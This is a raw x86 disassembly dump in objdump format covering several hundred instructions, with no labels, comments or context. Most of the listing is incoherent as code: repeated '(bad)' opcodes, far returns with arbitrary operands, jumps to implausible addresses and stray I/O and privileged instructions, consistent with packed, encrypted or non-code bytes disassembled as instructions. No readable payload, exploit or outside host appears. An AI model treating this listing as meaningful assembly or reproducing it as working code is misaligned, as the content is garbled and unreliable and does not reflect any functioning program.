  417efa:	mov    edx,0xff378d80
  417eff:	mov    dh,0xd1
  417f01:	cmp    edx,DWORD PTR [ebp+0xf]
  417f04:	mov    eax,DWORD PTR [edx-0x20]
  417f07:	add    BYTE PTR [ebp-0x75],bh
  417f0a:	xor    edi,DWORD PTR [ebx+eax*1-0x307bf035]
  417f11:	pushf  
  417f12:	retf   0x8632
  417f15:	cmp    ebp,0x8
  417f18:	call   ebx
  417f1a:	inc    ebp
  417f1b:	inc    ebp
  417f1c:	mov    ecx,DWORD PTR [ebx+0x450008d8]
  417f22:	mov    esi,DWORD PTR [ecx]
  417f24:	enter  0x49c,0xc7
  417f28:	add    al,al
  417f2a:	add    bl,al
  417f2c:	(bad)  
  417f2d:	clc    
  417f2e:	enter  0x45,0x31
  417f32:	push   eax
  417f33:	pushf  
  417f34:	mov    edi,eax
  417f36:	int3   
  417f37:	or     al,al
  417f39:	test   DWORD PTR [edi],edi
  417f3b:	clc    
  417f3c:	gs inc ebp
  417f3e:	add    BYTE PTR [ebx+0x4d00fc7d],cl
  417f44:	push   ss
  417f45:	xor    ecx,DWORD PTR [ebp+0x3]
  417f48:	sub    edx,DWORD PTR [ecx-0x76]
  417f4b:	dec    ebp
  417f4c:	add    DWORD PTR [ebx+0x88d845],ecx
  417f52:	mov    esi,DWORD PTR [ebx]
  417f54:	or     BYTE PTR [ebx],al
  417f56:	cmp    edx,DWORD PTR [ecx-0x38]
  417f59:	dec    ebp
  417f5a:	out    dx,eax
  417f5b:	xor    eax,DWORD PTR [ebp+0x3]
  417f5e:	mov    edx,DWORD PTR [ecx-0x28]
  417f61:	dec    ebp
  417f62:	add    BYTE PTR [ebx],dh
  417f64:	push   0x518003
  417f69:	push   eax
  417f6a:	add    BYTE PTR [ebx-0x300748b],cl
  417f70:	sbb    BYTE PTR [ebp+0x45],cl
  417f73:	mov    ecx,DWORD PTR [ecx+0x7d00d0d8]
  417f79:	xor    ecx,DWORD PTR [ebx-0x3cae0bfd]
  417f7f:	dec    ebp
  417f80:	inc    ebp
  417f81:	xor    ecx,eax
  417f83:	add    ecx,eax
  417f85:	push   ecx
  417f86:	(bad)  
  417f87:	dec    ebp
  417f88:	mov    al,ds:0xc5e03dff
  417f8d:	retf   
  417f8e:	(bad)  
  417f8f:	into   
  417f90:	sub    bh,bh
  417f92:	dec    esp
  417f93:	adc    al,0x9c
  417f95:	inc    ebp
  417f96:	push   ebp
  417f97:	test   DWORD PTR [edi],ecx
  417f99:	unpcklps xmm0,XMMWORD PTR [ecx-0x7ab8ff80]
  417fa0:	jmp    0xc9ba8eb4
  417fa5:	add    cl,dl
  417fa7:	mov    DWORD PTR [ebp+0x8501c0],0x33454df8
  417fb1:	xor    ecx,DWORD PTR [ebp+0x728b089c]
  417fb7:	rol    BYTE PTR [eax],0x55
  417fba:	clc    
  417fbb:	fs jb  0x417fc5
  417fbe:	mov    eax,DWORD PTR [ebp-0x30]
  417fc1:	xor    al,0x40
  417fc3:	sub    al,0xc7
  417fc5:	mov    ah,ch
  417fc7:	add    DWORD PTR [ebp+0x4534f845],eax
  417fcd:	sub    al,0x86
  417fcf:	mov    BYTE PTR [edx+eax*1-0x335a39],bl
  417fd6:	mov    ch,0xff
  417fd8:	clc    
  417fd9:	add    DWORD PTR [ebp+0x60],0x3d
  417fdd:	call   FWORD PTR [eax+eax*1-0x1f7a77]
  417fe4:	inc    ebp
  417fe5:	dec    DWORD PTR [ebx-0x341ff701]
  417feb:	test   esi,ecx
  417fed:	dec    DWORD PTR [ebx-0x7f8a3301]
  417ff3:	push   eax
  417ff4:	add    DWORD PTR [ebp+0x0],eax
  417ff7:	dec    ebx
  417ff9:	or     al,0xce
  417ffb:	ror    BYTE PTR [ebx-0x34173fb0],0x4
  418002:	into   
  418003:	add    BYTE PTR [ebx-0x34ff1400],cl
  418009:	mov    esi,ecx
  41800b:	sar    bh,0x45
  41800e:	adc    al,0x8b
  418010:	clc    
  418011:	fadd   DWORD PTR [ebp+0x0]
  418014:	mov    ebp,DWORD PTR [edx+0x8]
  418017:	push   edi
  418018:	adc    BYTE PTR [eax+0x1],0x83
  41801c:	add    al,al
  41801e:	retf   
  41801f:	mov    ecx,esi
  418021:	cld    
  418022:	mov    eax,DWORD PTR [eax+0xcb01cc]
  418028:	into   
  418029:	add    BYTE PTR [ebx+0x756aec00],cl
  41802f:	jne    0x418064
  418031:	inc    DWORD PTR [ebx]
  418033:	rcl    BYTE PTR [ecx+0x50],1
  418036:	push   eax
  418037:	mov    ecx,DWORD PTR [ecx-0xbaf7f8]
  41803d:	mov    eax,DWORD PTR [eax+eiz*8-0x14ffbafd]
  418044:	sar    bh,0x84
  418047:	or     BYTE PTR [ebx],al
  418049:	push   eax
  41804a:	add    BYTE PTR [ebx+0x4532c845],cl
  418050:	pushf  
  418051:	xor    edi,eax
  418053:	pushf  
  418054:	mov    ah,0x89
  418056:	test   eax,ebp
  418058:	clc    
  418059:	inc    ebp
  41805a:	inc    ebp
  41805b:	mov    DWORD PTR [eax+eax*8],esi
  41805e:	sub    al,0x30
  418060:	mov    BYTE PTR [ebx+ecx*4+0x55d8ec89],bl
  418067:	dec    ebp
  418068:	xor    eax,DWORD PTR fs:[edi+0x3]
  41806c:	mov    ecx,DWORD PTR [ecx+0x4d55f4b4]
  418072:	xor    eax,DWORD PTR fs:[edi+0x3]
  418076:	or     DWORD PTR [ecx+0x45ff085c],0x0
  41807d:	shl    DWORD PTR [ebp-0x380064],1
  418083:	int3   
  418084:	lea    eax,[ebp+0x45fff860]
  41808a:	push   eax
  41808b:	xor    dh,BYTE PTR [ebp-0x64]
  41808e:	(bad)  
  41808f:	(bad)  
  418090:	pop    esp
  418091:	lods   al,BYTE PTR ds:[esi]
  418092:	inc    DWORD PTR [ebp+0x4508f8ff]
  418098:	mov    edi,DWORD PTR [eax+edx*8]
  41809b:	pushf  
  41809c:	jo     0x418065
  41809e:	cmp    DWORD PTR [eax-0x7a87af0],0x46
  4180a5:	inc    ebp
  4180a6:	add    BYTE PTR [esi],bh
  4180a8:	push   0x8b809c
  4180ad:	in     al,dx
  4180ae:	inc    ebp
  4180af:	push   ebp
  4180b0:	mov    esi,DWORD PTR [ebx]
  4180b2:	cld    
  4180b3:	add    eax,DWORD PTR [eax+0xf013b]
  4180b9:	adc    al,0x0
  4180bb:	add    bh,bh
  4180bd:	jmp    0xbe81da
  4180c2:	add    BYTE PTR [ebp+0x45],cl
  4180c5:	mov    ecx,DWORD PTR [ebx+0xd1d8e8]
  4180cb:	dec    ebp
  4180cc:	push   0x38033
  4180d1:	cmp    eax,DWORD PTR [eax]
  4180d3:	unpcklps xmm7,xmm0
  4180d6:	jne    0x4180d8
  4180d8:	dec    DWORD PTR [ebx+0x5545cc18]
  4180de:	mov    DWORD PTR [ebx],esi
  4180e0:	shl    BYTE PTR [ebx],1
  4180e2:	inc    ebp
  4180e3:	add    ecx,DWORD PTR [ecx+0x60fc803]
  4180e9:	retf   0x5575
  4180ec:	dec    DWORD PTR [ebx-0x5ba17e8]
  4180f2:	(bad)  
  4180f3:	stc    
  4180f4:	in     al,dx
  4180f5:	or     al,0x85
  4180f7:	dec    ebp
  4180f8:	clc    
  4180f9:	xor    eax,DWORD PTR [ebp+0x3]
  4180fc:	mov    ebp,ecx
  4180fe:	rol    BYTE PTR [eax],1
  418100:	inc    ebp
  418101:	add    BYTE PTR [eax-0x7747ab3],bh
  418107:	clc    
  418108:	inc    ebp
  418109:	retf   
  41810a:	mov    edx,ebx
  41810c:	in     al,dx
  41810d:	(bad)  
  41810e:	retf   
  41810f:	into   
  418110:	into   
  418111:	scas   eax,DWORD PTR es:[edi]
  418112:	dec    ebp
  418113:	mov    ecx,DWORD PTR [ebx-0x3482130c]
  418119:	sub    ecx,esi
  41811b:	cmp    ecx,DWORD PTR [ebp+0x77]
  41811e:	(bad)  
  41811f:	mov    edi,eax
  418121:	int3   
  418122:	test   DWORD PTR [ecx-0x74baff08],ecx
  418128:	xor    ebp,DWORD PTR [esp+ebx*4-0x57cc38ab]
  41812f:	xor    eax,DWORD PTR [ebp+0x4503f803]
  418135:	(bad)  
  418137:	retf   0x559c
  41813a:	(bad)  
  41813b:	mov    esp,DWORD PTR [eax+ebp*8-0x607057b]
  418142:	inc    ebp
  418143:	add    eax,0xeb9c4d3f
  418148:	(bad)  
  418149:	mov    esi,DWORD PTR [eax-0x7aa7a5c]
  41814f:	xor    ecx,DWORD PTR [ebp+0x33]
  418152:	mov    eax,DWORD PTR [ebx]
  418154:	call   0xce514c5c
  418159:	retf   0x55d1
  41815c:	test   BYTE PTR [ebx-0x5ff17fe],cl
  418162:	jmp    0x41815d
  418164:	add    BYTE PTR ds:0xebf44d8b,al
  41816a:	push   ebp
  41816b:	mov    ebp,DWORD PTR [ebx]
  41816d:	mov    eax,0x33f8558b
  418172:	retf   
  418173:	xor    ecx,esi
  418175:	add    edx,ecx
  418177:	add    eax,DWORD PTR [edx+0xca010f]
  41817d:	push   ebp
  41817e:	dec    ebp
  41817f:	mov    ecx,DWORD PTR [ebx-0x34050718]
  418185:	stc    
  418186:	rol    DWORD PTR ds:0xebce4dd6,cl
  41818c:	scas   eax,DWORD PTR es:[edi]
  41818d:	mov    ecx,DWORD PTR [ebx+0x7d55f4b0]
  418193:	xor    ebp,DWORD PTR [ebx]
  418195:	xor    edi,DWORD PTR [ebx]
  418197:	add    esi,DWORD PTR [edi+0x3]
  41819a:	mov    ecx,DWORD PTR [edi]
  41819c:	clc    
  41819d:	retf   0x55cb
  4181a0:	into   
  4181a1:	mov    edi,DWORD PTR [eax+ebp*8-0x6740600]
  4181a8:	test   al,0x4d
  4181aa:	push   ebp
  4181ab:	jbe    0x4181e0
  4181ad:	mov    esi,DWORD PTR [ebx]
  4181af:	mov    al,0x3
  4181b1:	push   ebp
  4181b2:	add    esi,DWORD PTR [ebx]
  4181b4:	rdpmc  
  4181b6:	retf   0x5503
  4181b9:	add    ecx,DWORD PTR [ebx-0x53517f1]
  4181bf:	dec    ebp
  4181c0:	stc    
  4181c1:	mov    ecx,DWORD PTR [eax]
  4181c3:	or     BYTE PTR [ebp+0x4d],cl
  4181c6:	jmp    0x1358256
  4181cb:	dec    ebp
  4181cc:	dec    ebp
  4181cd:	(bad)  
  4181ce:	mov    ebx,esp
  4181d0:	clc    
  4181d1:	test   ebx,ecx
  4181d3:	clc    
  4181d4:	ror    DWORD PTR [ebp-0x2a],cl
  4181d7:	mov    esi,ecx
  4181d9:	lock scas eax,DWORD PTR es:[edi]
  4181db:	inc    ebp
  4181dc:	mov    esi,DWORD PTR [ebx]
  4181de:	hlt    
  4181df:	pushf  
  4181e0:	jge    0x41816d
  4181e2:	sub    ebx,esp
  4181e4:	cmp    ecx,ebx
  4181e6:	ja     0x4181b6
  4181e8:	mov    ebp,DWORD PTR [eax-0x58]
  4181eb:	dec    ebp
  4181ec:	xor    ecx,DWORD PTR [di+0x3]
  4181f0:	mov    esp,esp
  4181f2:	clc    
  4181f3:	push   ebp
  4181f4:	retf   
  4181f5:	mov    dl,bl
  4181f7:	adc    esi,edx
  4181f9:	jb     0x4181c9
  4181fb:	add    BYTE PTR [edi-0xb7474b3],ch
  418201:	lock jge 0x4181cf
  418204:	sub    ecx,DWORD PTR [ebp+0x3b]
  418207:	mov    esi,DWORD PTR [edi-0x20]
  41820a:	mov    ecx,DWORD PTR [esp+ebp*4+0x4d32459c]
  418211:	mov    BYTE PTR [ebx-0x34b20729],cl
  418217:	mov    edx,ebx
  418219:	lock (bad) 
  41821b:	ror    esi,cl
  41821d:	push   ebp
  41821e:	scas   eax,DWORD PTR es:[edi]
  41821f:	mov    ecx,DWORD PTR [ebx+0x7d8cf4e0]
  418225:	pushf  
  418226:	sub    esi,DWORD PTR [edx]
  418228:	cmp    ecx,DWORD PTR [edx+0x558bd777]
  41822e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41822f:	xor    esp,DWORD PTR [ebx]
  418231:	add    ecx,DWORD PTR [ebp-0x1c]
  418234:	mov    edi,DWORD PTR [ebp-0x8]
  418237:	mov    bl,cl
  418239:	cmp    dl,bl
  41823b:	jb     0x41820b
  41823d:	add    dh,dl
  41823f:	dec    ebp
  418240:	scas   eax,DWORD PTR es:[edi]
  418241:	mov    ecx,DWORD PTR [ebx+0x7dcbf4f0]
  418247:	shr    DWORD PTR [ebx],cl
  418249:	into   
  41824a:	cmp    edx,esi
  41824c:	mov    ebp,DWORD PTR [edi-0x1bfcfc48]
  418252:	dec    ebp
  418253:	dec    ebp
  418254:	mov    ecx,DWORD PTR [ebx+0x55d3f0f8]
  41825a:	retf   
  41825b:	xor    edx,esi
  41825d:	add    ecx,esi
  41825f:	imul   ecx,edx
  418262:	mov    DWORD PTR [ebp+0x8],edx
  418265:	xor    ecx,DWORD PTR [ebp+0x2b]
  418268:	mov    DWORD PTR [ebx+0x7d4df0ec],ecx
  41826e:	add    esi,DWORD PTR [ebx]
  418270:	rol    BYTE PTR [ebx],0x45
  418273:	rdtsc  
  418275:	xlat   BYTE PTR ds:[ebx]
  418276:	pushf  
  418277:	jge    0x418202
  418279:	xor    esp,eax
  41827b:	sub    eax,DWORD PTR [ebp-0x73]
  41827e:	(bad)  
  41827f:	cmp    dh,BYTE PTR [edx+esi*2-0x2e07ff7b]
  418286:	dec    ebp
  418287:	xchg   BYTE PTR [ebx],dh
  418289:	inc    DWORD PTR [ebx]
  41828b:	(bad)  
  41828c:	jmp    0x4182db
  41828e:	mov    ecx,DWORD PTR [ebx-0x34341324]
  418294:	dec    ebp
  418295:	into   
  418296:	mov    ebp,DWORD PTR [edi-0x23737420]
  41829c:	pushf  
  41829d:	shl    DWORD PTR [edx],cl
  41829f:	retf   0x5588
  4182a2:	or     ecx,DWORD PTR [ebp+0x7233114d]
  4182a8:	add    eax,DWORD PTR [eax]
  4182aa:	in     al,0x4d
  4182ac:	push   ebp
  4182ad:	mov    ecx,DWORD PTR [edx+0x72cb11d8]
  4182b3:	fs add ch,cl
  4182b6:	dec    ebp
  4182b7:	sub    ecx,DWORD PTR [edx+0x55e80b03]
  4182bd:	dec    ebp
  4182be:	xor    ecx,DWORD PTR [ebx-0x341b0bfd]
  4182c4:	jge    0x418294
  4182c6:	mov    BYTE PTR [edi+0xf723b3a],ch
  4182cc:	add    cl,dh
  4182ce:	dec    ebp
  4182cf:	dec    DWORD PTR [ebx-0x2c032301]
  4182d5:	inc    ebp
  4182d6:	push   ebp
  4182d7:	dec    DWORD PTR [ebx-0x73ff1f34]
  4182dd:	lea    ebx,[esp+edx*2+0x508bff32]
  4182e4:	mov    ah,0x45
  4182e6:	push   ebp
  4182e7:	mov    esi,DWORD PTR [ebx]
  4182e9:	les    esi,FWORD PTR [ebx]
  4182eb:	add    BYTE PTR [ebx],al
  4182ed:	inc    DWORD PTR [ebx]
  4182ef:	mov    ecx,DWORD PTR [edi]
  4182f1:	cld    
  4182f2:	retf   0x4d80
  4182f5:	add    DWORD PTR [ecx+0x4d30e400],ecx
  4182fb:	jne    0x418288
  4182fd:	(bad)  
  4182fe:	in     al,dx
  4182ff:	ror    bl,1
  418301:	scas   al,BYTE PTR es:[edi]
  418302:	into   
  418303:	add    BYTE PTR [edi-0xf2f7475],ch
  418309:	not    bl
  41830b:	adc    al,0xca
  41830d:	inc    ebp
  41830e:	push   ebp
  41830f:	mov    ecx,DWORD PTR [ebx-0x2cff1b28]
  418315:	push   0xaf80d6
  41831a:	mov    eax,DWORD PTR [eax]
  41831c:	fdiv   st(7),st
  41831e:	sti    
  41831f:	sbb    dh,cl
  418321:	pop    esi
  418322:	xchg   esp,eax
  418323:	leave  
  418324:	pushf  
  418325:	add    al,0x32
  418327:	push   ebp
  418328:	cmp    ebp,esp
  41832a:	sqrtps xmm3,XMMWORD PTR [esi+0x45]
  41832e:	dec    DWORD PTR [ecx-0x740f0375]
  418334:	push   ebp
  418335:	cld    
  418336:	xor    ecx,DWORD PTR [edi-0x76f07efd]
  41833c:	retf   0x558b
  41833f:	clc    
  418340:	xor    esi,eax
  418342:	add    esi,DWORD PTR [ebp-0x75]
  418345:	(bad)  
  418346:	hlt    
  418347:	or     cl,BYTE PTR [esi+eax*8-0x39cdf764]
  41834e:	mov    DWORD PTR [edx],ecx
  418350:	hlt    
  418351:	(bad)  
  418352:	dec    ebp
  418353:	add    dh,BYTE PTR [ebx]
  418355:	leave  
  418356:	mov    edx,0xffec8d55
  41835b:	push   ecx
  41835c:	rol    DWORD PTR [ebp+0x55],1
  41835f:	mov    DWORD PTR [ebx+0x7d55d8fc],ecx
  418365:	mov    eax,0xf8030b33
  41836a:	lar    ecx,di
  41836d:	push   ebp
  41836e:	retf   0x863b
  418371:	jne    0x418370
  418373:	mov    edi,edi
  418375:	or     BYTE PTR [ebp+0x41],dh
  418378:	mov    ebp,esp
  41837a:	cld    
  41837b:	inc    eax
  41837c:	mov    al,0x25
  41837e:	add    DWORD PTR [ecx+0x0],eax
  418381:	in     eax,dx
  418382:	test   DWORD PTR [ecx-0x1],eax
  418385:	fdiv   st(7),st
  418387:	ret    0x8b
  41838a:	cld    
  41838b:	mov    eax,DWORD PTR [eax+0x8d0151]
  418391:	clc    
  418392:	xor    BYTE PTR [ebp+0x45],al
  418395:	mov    ecx,DWORD PTR [ebx+0x8fc0fc]
  41839b:	loopne 0x41839c
  41839d:	mov    edi,edi
  41839f:	mov    ecx,eax
  4183a1:	clc    
  4183a2:	jne    0x418374
  4183a4:	call   0x8294ad
  4183a9:	and    eax,0xc6854575
  4183ae:	je     0x4183b1
  4183b0:	mov    eax,esi
  4183b2:	cld    
  4183b3:	or     DWORD PTR [eax+0x401c9],eax
  4183b9:	push   ebp
  4183ba:	add    ah,ch
  4183bc:	add    BYTE PTR [ecx+0x6a],dl
  4183bf:	inc    ebp
  4183c0:	push   esi
  4183c1:	mov    DWORD PTR [eax-0x4],edx
  4183c4:	pop    edi
  4183c5:	mov    ebx,DWORD PTR [ebx-0x4]
  4183c8:	ret    0xbe
  4183cb:	push   es
  4183cc:	mov    ecx,DWORD PTR [ecx-0x77274af]
  4183d2:	clc    
  4183d3:	lock inc ebp
  4183d5:	jne    0x41842d
  4183d7:	(bad)  
  4183d8:	jne    0x4183de
  4183da:	mov    eax,0xf841ba66
  4183df:	fadd   QWORD PTR [esi]
  4183e1:	(bad)  
  4183e2:	jne    0x418421
  4183e4:	cmp    eax,ebx
  4183e6:	pop    esi
  4183e7:	mov    ecx,DWORD PTR [eax]
  4183e9:	push   ecx
  4183ea:	inc    ecx
  4183eb:	lea    esi,[eax-0x8]
  4183ee:	inc    edx
  4183ef:	inc    ebp
  4183f0:	int    0x8b
  4183f2:	inc    edx
  4183f3:	cld    
  4183f4:	jo     0x4183b5
  4183f6:	inc    ecx
  4183f7:	xchg   edx,esp
  4183f9:	mov    ebx,eax
  4183fb:	mov    ecx,DWORD PTR [ebx-0x722fae08]
  418401:	or     edi,eax
  418403:	inc    ebp
  418404:	inc    ebp
  418405:	(bad)  
  418406:	mov    ecx,DWORD PTR [eax]
  418408:	cld    
  418409:	(bad)  
  41840a:	jmp    0x41840d
  41840c:	mov    eax,esi
  41840e:	mov    DWORD PTR ds:0x4f8c98b,eax
  418414:	rcl    BYTE PTR [esi+0xf],1
  418417:	iret   
  418418:	inc    ebp
  418419:	leave  
  41841a:	(bad)  
  41841b:	dec    DWORD PTR [ecx]
  41841d:	mov    eax,esi
  41841f:	mov    eax,DWORD PTR [edi]
  418421:	mov    dh,0xdd
  418424:	push   es
  418425:	nop
  418426:	(bad)  
  418427:	inc    DWORD PTR [ebx]
  418429:	push   esi
  41842a:	leave  
  41842b:	iret   
  41842c:	add    al,0x46
  41842e:	push   ebp
  41842f:	jmp    0xff92da20
  418434:	inc    ebp
  418435:	push   esi
  418436:	mov    DWORD PTR [esi-0x4],eax
  418439:	in     eax,dx
  41843a:	push   ebp
  41843b:	sbb    BYTE PTR [eax+0x7c6daff],bh
  418441:	add    al,BYTE PTR [edx]
  418443:	mov    edx,DWORD PTR [ebp-0x17]
  418446:	cmp    edi,esi
  418448:	jne    0x418449
  41844a:	(bad)  
  41844b:	push   esi
  41844c:	pop    es
  41844d:	push   ebp
  41844e:	mov    ebp,esp
  418450:	or     BYTE PTR [ebp+0x41],al
  418453:	add    edi,esp
  418455:	sub    BYTE PTR [eax-0x4],al
  418458:	int3   
  418459:	jne    0x41841d
  41845b:	add    DWORD PTR [eax],eax
  41845d:	sbb    al,0x8b
  41845f:	mov    edx,DWORD PTR [ecx+0x14]
  418462:	lea    edx,[edx-0x1ba7508]
  418468:	push   esi
  418469:	enter  0xd375,0xb8
  41846d:	test   DWORD PTR [esi],0x6ce0750
  418473:	enter  0xd375,0x3b
  418477:	neg    DWORD PTR [esi+0x50]
  41847a:	or     cl,dl
  41847c:	inc    edx
  41847d:	(bad)  
  41847e:	loope  0x41846c
  418480:	(bad)  
  418481:	sub    eax,DWORD PTR [ebx]
  418483:	inc    eax
  418484:	loope  0x4184d6
  418486:	add    dl,BYTE PTR [eax-0x37]
  418489:	push   edi
  41848a:	push   ebp
  41848b:	imul   ah
  41848d:	adc    DWORD PTR [ecx-0x1],0x45
  418491:	add    BYTE PTR [ecx+0x55d3fc00],cl
  418497:	lea    edi,[eax-0x7fff4ca]
  41849d:	mov    eax,0x4550402
  4184a2:	cmp    ebp,ecx
  4184a4:	jne    0x418451
  4184a6:	mov    eax,DWORD PTR ds:0x241e808
  4184ac:	in     eax,dx
  4184ad:	add    BYTE PTR [eax-0x7],al
  4184b0:	out    0x36,eax
  4184b2:	inc    ecx
  4184b3:	aas    
  4184b4:	jmp    0xcd4736
  4184b9:	lock mov edi,DWORD PTR [ebp-0x18]
  4184bd:	and    edi,edi
  4184bf:	mov    edi,edi
  4184c1:	call   0xe40f859d
  4184c6:	push   es
  4184c7:	add    al,ch
  4184c9:	ud0    edx,DWORD PTR [ebp-0x7574ff01]
  4184d0:	(bad)  
  4184d1:	hlt    
  4184d2:	add    eax,0xffd3e87d
  4184d7:	cmp    bh,0x8
  4184da:	(bad)  
  4184db:	fld    DWORD PTR [esi]
  4184dd:	out    dx,al
  4184de:	call   0xffa083e6
  4184e3:	cmp    al,0x46
  4184e5:	shl    edx,0x8
  4184e8:	(bad)  
  4184e9:	pop    es
  4184ea:	fisttp QWORD PTR [ebp+0xe577eff]
  4184f0:	push   ebx
  4184f1:	add    BYTE PTR [ebx+0x24008b56],cl
  4184f7:	add    BYTE PTR [ebp+0x50],al
  4184fa:	push   eax
  4184fb:	add    DWORD PTR [ebx+0x757d1834],ecx
  418501:	sub    edx,DWORD PTR [esi-0x24]
  418504:	jne    0x4184bc
  418506:	lods   eax,DWORD PTR ds:[esi]
  418507:	mov    edx,DWORD PTR [edx-0x34]
  41850a:	dec    esi
  41850b:	out    0x83,eax
  41850d:	into   
  41850e:	push   edi
  418510:	loopne 0x4184e0
  418512:	shr    BYTE PTR [edx+ecx*4+0x0],1
  418516:	xor    DWORD PTR [eax-0x741fff01],0xffffffd0
  41851d:	rol    DWORD PTR [edx],0x8
  418520:	mov    esp,ecx
  418522:	cmp    DWORD PTR [ebx],0xc
  418525:	mov    esi,0x5001c0
  41852a:	push   eax
  41852b:	push   cs
  41852c:	push   eax
  41852d:	(bad)  
  41852e:	sub    edx,edi
  418530:	push   esi
  418531:	adc    al,0xcb
  418533:	ins    DWORD PTR es:[edi],dx
  418534:	mov    eax,0x203e8
  418539:	add    al,ah
  41853b:	inc    esi
  41853c:	mov    al,ch
  41853e:	pop    es
  41853f:	add    DWORD PTR [eax],0x1
  418542:	add    dh,al
  418544:	add    ah,ch
  418546:	rol    DWORD PTR [edx-0xd],1
  418549:	cli    
  41854a:	push   0x4a
  41854c:	pop    ecx
  41854d:	retf   0xfe6
  418550:	add    BYTE PTR [ebx-0x4e72f41e],al
  418556:	(bad)  
  418557:	dec    BYTE PTR [ebx+0x45b1fc72]
  41855d:	(bad)  
  41855e:	sub    ebp,DWORD PTR [ebx]
  418560:	and    al,0x52
  418562:	(bad)  
  418563:	dec    edi
  418564:	inc    ebp
  418565:	shl    DWORD PTR [eax+0x24fe8c8],0x0
  41856c:	add    BYTE PTR [ebp-0x7b],dh
  41856f:	pop    eax
  418570:	add    BYTE PTR [edx+0x0],bl
  418573:	pop    edx
  418574:	dec    ebp
  418575:	jmp    DWORD PTR [ebx]
  418577:	and    al,0xec
  418579:	push   edx
  41857a:	out    0x64,eax
  41857c:	jmp    0xd3f37b81
  418581:	jmp    0x4185db
  418583:	mov    al,0xfe
  418585:	dec    BYTE PTR [ebp-0x18fd8018]
  41858b:	add    BYTE PTR [esi+ebp*1],bh
  41858e:	pop    edx
  41858f:	icebp  
  418590:	mov    eax,cs
  418592:	ins    BYTE PTR es:[edi],dx
  418593:	adc    eax,0x75510000
  418598:	mov    esi,0x70158
  41859d:	or     DWORD PTR [eax-0x74f48dfe],esi
  4185a3:	mov    edi,esp
  4185a5:	cld    
  4185a6:	jge    0x41861d
  4185a8:	(bad)  
  4185aa:	aas    
  4185ab:	and    al,0x6d
  4185ad:	adc    cl,0x1
  4185b0:	mov    eax,DWORD PTR [eax]
  4185b2:	and    ecx,DWORD PTR [ebx-0x167203fd]
  4185b8:	dec    ebp
  4185b9:	add    eax,ebp
  4185bb:	add    BYTE PTR [edx],al
  4185bd:	fadd   DWORD PTR [eax]
  4185bf:	stc    
  4185c0:	enter  0xee00,0x8b
  4185c4:	sbb    eax,0x1
  4185c7:	sbb    esi,ecx
  4185c9:	in     al,0x0
  4185cb:	in     eax,dx
  4185cc:	add    BYTE PTR [eax],al
  4185ce:	jne    0x41855b
  4185d0:	cmp    edx,esp
  4185d2:	jb     0x4185dd
  4185d4:	jmp    0x41864b
  4185d6:	mov    ecx,DWORD PTR [ebx+0x4d91d4cc]
  4185dc:	add    BYTE PTR [ebx+0x4d83d840],cl
  4185e2:	add    DWORD PTR [ebx+0x4d3bdcee],ecx
  4185e8:	jb     0x418573
  4185ea:	pop    edx
  4185eb:	fadd   QWORD PTR [ebx-0x7445faa1]
  4185f1:	or     dh,BYTE PTR [edx+0x0]
  4185f4:	inc    edx
  4185f5:	or     dl,bh
  4185f7:	xlat   BYTE PTR ds:[ebx]
  4185f8:	dec    edx
  4185f9:	push   edi
  4185fa:	add    al,0x7
  4185fc:	leave  
  4185fd:	rol    DWORD PTR [edx+eax*1],0x7
  418601:	add    ecx,ecx
  418603:	mov    edx,ecx
  418605:	int3   
  418606:	jmp    0x4185c6
  418608:	mov    al,0x0
  41860a:	(bad)  
  41860b:	jne    0x4185f5
  41860d:	mov    eax,DWORD PTR [edx]
  41860f:	call   0xc1560314
  418614:	pop    edi
  418615:	add    ebx,DWORD PTR [ecx-0x37]
  418618:	pop    ecx
  418619:	or     BYTE PTR [ecx*4-0x1445b8af],dh
  418620:	push   es
  418621:	mov    eax,DWORD PTR [eax]
  418623:	int3   
  418624:	add    ch,al
  418626:	jae    0x418610
  418628:	int    0x1
  41862a:	enter  0x3000,0x18
  41862e:	add    BYTE PTR [ebp+0x75],al
  418631:	mov    esi,DWORD PTR [eax-0x171f0134]
  418637:	push   0x2
  418639:	pop    ecx
  41863a:	add    BYTE PTR [eax],cl
  41863c:	push   ebx
  41863d:	lea    edi,[edi+eax*2]
  418640:	mov    al,0x1
  418642:	jb     0x418644
  418644:	mov    al,0x10
  418646:	push   eax
  418647:	add    al,0x75
  418649:	add    BYTE PTR [ebx],ch
  41864b:	add    ebx,esp
  41864d:	int3   
  41864e:	jne    0x418660
  418650:	movsx  edx,cl
  418653:	add    DWORD PTR [eax],eax
  418655:	add    BYTE PTR [ebp+ecx*2+0x40aa2b7d],ch
  41865c:	mov    gs,edi
  41865e:	add    BYTE PTR [eax-0x50],ch
  418661:	add    al,ch
  418663:	mov    eax,DWORD PTR [ecx]
  418665:	sub    eax,DWORD PTR [eax]
  418667:	jb     0x4186de
  418669:	add    DWORD PTR [esp+eiz*8-0x50],esi
  41866d:	jge    0x418657
  41866f:	add    al,0x1
  418671:	add    DWORD PTR [eax],0x0
  418674:	jne    0x418676
  418676:	je     0x4186bd
  418678:	mov    eax,DWORD PTR [edi]
  41867a:	ror    BYTE PTR [ebp+0x4d],1
  41867d:	or     DWORD PTR [ecx+0x4d03d004],0x3
  418684:	mov    DWORD PTR [ebx-0x1eb2372c],ecx
  41868a:	mov    DWORD PTR [ebx],ebp
  41868c:	fadd   DWORD PTR [eax+0x75]
  41868f:	inc    eax
  418690:	pop    eax
  418691:	lea    ebx,[ecx+0x4f]
  418694:	push   0xb1000003
  418699:	out    dx,eax
  41869a:	add    ebp,DWORD PTR [edx+edx*2]
  41869d:	add    BYTE PTR [ebx+ecx*4],bh
  4186a0:	mov    ch,BYTE PTR [ebx]
  4186a2:	jb     0x418716
  4186a4:	add    al,0x89
  4186a6:	push   eax
  4186a7:	call   0x8429d419
  4186ac:	add    DWORD PTR [eax+eax*1],eax
  4186af:	jae    0x4186c5
  4186b1:	icebp  
  4186b2:	inc    ebp
  4186b3:	mov    eax,DWORD PTR gs:[ecx]
  4186b6:	int3   
  4186b7:	out    dx,al
  4186b8:	loopne 0x418707
  4186ba:	sub    eax,DWORD PTR [edx]
  4186bc:	push   0xffffff83
  4186be:	pop    esi
  4186bf:	push   cs
  4186c0:	jl     0x4186db
  4186c2:	add    al,0xaf
  4186c4:	xor    eax,0x832b6d00
  4186c9:	mov    eax,DWORD PTR [edx]
  4186cb:	rcr    BYTE PTR [ebp+0x754500dc],cl
  4186d1:	ror    DWORD PTR [ebx+0x7dc8e803],1
  4186d7:	inc    ebp
  4186d8:	shr    ebx,0x3
  4186db:	or     DWORD PTR [eax],0x4
  4186de:	push   0xffffffa5
  4186e0:	pop    esi
